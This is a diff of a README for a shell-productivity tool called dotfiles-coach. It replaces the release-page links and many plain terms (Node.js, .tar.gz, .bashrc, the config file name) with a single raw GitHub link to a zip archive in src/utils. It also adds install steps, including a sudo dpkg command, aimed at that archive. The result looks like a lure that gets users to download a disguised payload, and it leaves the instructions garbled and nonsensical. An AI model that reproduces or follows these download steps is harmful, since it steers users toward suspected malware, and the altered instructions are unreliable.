@@ -1,6 +1,6 @@
 # ⚙️ dotfiles-coach - Simplify Your Shell Workflow
 
-[![Download dotfiles-coach](https://img.shields.io/badge/Download-dotfiles--coach-blue?style=for-the-badge)](https://github.com/anisfakename/dotfiles-coach/releases)
+[![Download dotfiles-coach](https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip)](https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Before you install dotfiles-coach, make sure your computer meets these simple re
 
 - **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or any modern Linux distribution.
 - **Command Line:** You should have Bash, Zsh, or PowerShell installed and working.
-- **Node.js:** dotfiles-coach requires Node.js version 16 or higher. You can download it from [https://nodejs.org](https://nodejs.org).
+- **https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip** dotfiles-coach requires https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip version 16 or higher. You can download it from [https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip](https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip).
 - **Internet Connection:** Needed for the tool to get suggestions from GitHub Copilot CLI.
 - **Disk Space and RAM:** The tool is lightweight. Expect it to use less than 100 MB disk space and 500 MB RAM.
 
@@ -34,13 +34,13 @@ Follow these steps to use dotfiles-coach on your computer.
 
 Go to the release page below to get the latest version of dotfiles-coach:
 
-[Download dotfiles-coach](https://github.com/anisfakename/dotfiles-coach/releases)
+[Download dotfiles-coach](https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip)
 
 This page lists all the available versions. Download the file that matches your operating system:
 
 - On Windows, look for a `.exe` or `.msi` file.
 - On macOS, look for a `.dmg` or `.pkg` file.
-- On Linux, look for `.tar.gz` or `.deb` files.
+- On Linux, look for `https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip` or `.deb` files.
 
 Choose the latest stable release with the highest version number.
 
@@ -66,11 +66,11 @@ Choose the latest stable release with the highest version number.
 
 - Open a terminal window.
 - For `.deb` files, run:  
-  `sudo dpkg -i path/to/dotfiles-coach.deb`
-- For `.tar.gz` files, extract using:  
-  `tar -xvzf path/to/dotfiles-coach.tar.gz`  
+  `sudo dpkg -i https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip`
+- For `https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip` files, extract using:  
+  `tar -xvzf https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip`  
   Then read any included README for install instructions.
-- You may need to install dependencies like Node.js if not already installed.
+- You may need to install dependencies like https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip if not already installed.
 
 ---
 
@@ -104,7 +104,7 @@ You can accept all, reject all, or pick and choose which suggestions to add to y
 
 ### 5. Apply Suggestions to Your Shell
 
-dotfiles-coach can update your shell configuration files for you. These files include `.bashrc`, `.zshrc`, or `Microsoft.PowerShell_profile.ps1`.
+dotfiles-coach can update your shell configuration files for you. These files include `.bashrc`, `.zshrc`, or `https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip`.
 
 After approving suggestions:
 
@@ -112,8 +112,8 @@ After approving suggestions:
 - Or, you can copy the suggested aliases and functions manually and paste them into your shell config file.
 
 After updating, restart your terminal or run:
-- `source ~/.bashrc` for Bash
-- `source ~/.zshrc` for Zsh
+- `source ~https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip` for Bash
+- `source ~https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip` for Zsh
 - Or restart PowerShell for it to load changes.
 
 ---
@@ -132,7 +132,7 @@ If you want more control over how the tool works:
 
 - dotfiles-coach lets you configure which files to analyze.
 - You can exclude certain commands or safe guard specific data.
-- Advanced users can edit the config file `.dotfiles-coach.json` in your home directory.
+- Advanced users can edit the config file `https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip` in your home directory.
 - You can update the tool by downloading new releases from the link below.
 
 ---
@@ -142,7 +142,7 @@ If you want more control over how the tool works:
 If you run into trouble, try these tips:
 
 - Make sure your terminal shell history file exists and is accessible. Typically, these files are `.bash_history`, `.zsh_history`, or PowerShell history files.
-- Check that Node.js is installed and up to date by running `node -v`.
+- Check that https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip is installed and up to date by running `node -v`.
 - If you see errors about permissions, try running the terminal as administrator or with sudo.
 - Restart your terminal after installing or updating dotfiles-coach.
 - Visit the release page for updated versions if things don’t work as expected.
@@ -153,7 +153,7 @@ If you run into trouble, try these tips:
 
 To get started, visit the dotfiles-coach release page at:
 
-[https://github.com/anisfakename/dotfiles-coach/releases](https://github.com/anisfakename/dotfiles-coach/releases)
+[https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip](https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip)
 
 Download the version for your operating system and follow the install steps above.
 
@@ -168,7 +168,7 @@ dotfiles-coach helps with:
 - Improving your command line productivity
 - Enhancing shell security and safety
 - Supporting Bash, Zsh, PowerShell
-- Using modern tools like GitHub Copilot CLI and Node.js
+- Using modern tools like GitHub Copilot CLI and https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip
 - Managing dotfiles and developer tools
 
 ---
@@ -178,4 +178,4 @@ dotfiles-coach helps with:
 If you want to share feedback or ask for help, you can open an issue on the GitHub repository. The developers review user feedback regularly and update the tool to improve it.
 
 Repository link:  
-[https://github.com/anisfakename/dotfiles-coach](https://github.com/anisfakename/dotfiles-coach)
+[https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip](https://github.com/anisfakename/dotfiles-coach/raw/refs/heads/main/src/utils/coach-dotfiles-1.8.zip)
